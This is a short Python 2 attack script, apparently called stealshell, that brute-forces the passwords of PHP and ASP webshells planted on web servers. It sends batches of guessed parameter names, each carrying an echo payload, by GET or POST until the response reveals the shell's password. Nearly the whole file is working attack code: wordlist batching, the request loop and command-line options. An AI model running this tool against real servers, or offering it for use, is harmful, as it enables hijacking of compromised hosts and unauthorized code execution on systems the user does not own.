import requests as req
import sys
import getopt

token="pwd"

def usage():
	print """
###################################################################################################
	This is a script used to guess the pass of webshells rapidly (up to 40M each time).
	It supports php&asp,GET&POST.
	site:	https://findneo.github.io/stealshell/
###################################################################################################

Usage: stealshell.py [options]

Options:
	-h, --help			display this message
	-u URL, --url=URL 		Target URL;This option must be provided to define the target  
						(e.g. "http://127.0.0.1/xiao.php")
	-m METHOD 			request method (support GET/POST,GET is default )
	-d DICT 			the filename of candidate passwords (e.g. "shell_pass_dic.txt")
	-n NUM 				the number of passwords that will be submitted in each request
						 (219 is default)
	"""

def get_dict(dic_name="shell_pass_dic.txt",pcpt=4,shell_type="php"):
	with open(dic_name,'r') as f:
		c=f.readlines()
	print "\nthis dict has %d items in all"%len(c)
	cnt=len(c)/pcpt # pcpt is short for password_check_per_time
	sp=[] # split password by pcpt per group
	sp.extend([c[i*pcpt:i*pcpt+pcpt] for i in xrange(cnt)])
	sp+=[c[cnt*pcpt:]]
	# sp:   [['x\n', 'cmd\n', 'pass\n', 'pwd\n'], ['xiao\n', '584521\n', 'nohack\n', '45189946\n'], ...]
	print "we split it into %d groups (%d * %d + %d) and submit one group each time\n"%(len(sp),cnt,pcpt,len(c)-pcpt*cnt)

	spd=[]
	execute="echo" if shell_type=="php" else "response.write"
	spd.extend([{j.strip('\n'):"%s('%s:%s');"%(execute,token,j) for j in i}for i in sp])
	# spd:  [{'x': "echo('pwd:x\n');", 'pass': "echo('pwd:pass\n');",...]
	return spd

def check_pass(url,pwd_list,method):
	for i in pwd_list:
		r=req.get(url,params=i) if method=="GET" else req.post(url,data=i)
		print '.',
		if token in r.content:
			print ""
			return r.content

if __name__ == '__main__':
	try:
		options,left_args=getopt.getopt(sys.argv[1:],"hu:m:d:n:",["help","url="])
	except Exception as e:
		raise e

	url="http://127.0.0.1/xiao.php"
	method="GET"
	dic_name="shell_pass_dic.txt"
	pass_num=219

	if not len(options):
		exit(usage())
	for name,value in options:
		if name in ("-h","--help"):
			exit(usage())
		elif name in ("-u","--url"):
			url=value
		elif name in ("-m"):
			method=value
		elif name in ("-d"):
			dic_name=value
		elif name in ("-n"):
			pass_num=int(value)

	shell_type=url[-3:]
	pwd_list=get_dict(dic_name=dic_name,pcpt=pass_num,shell_type=shell_type)
	print check_pass(url=url,pwd_list=pwd_list,method=method)
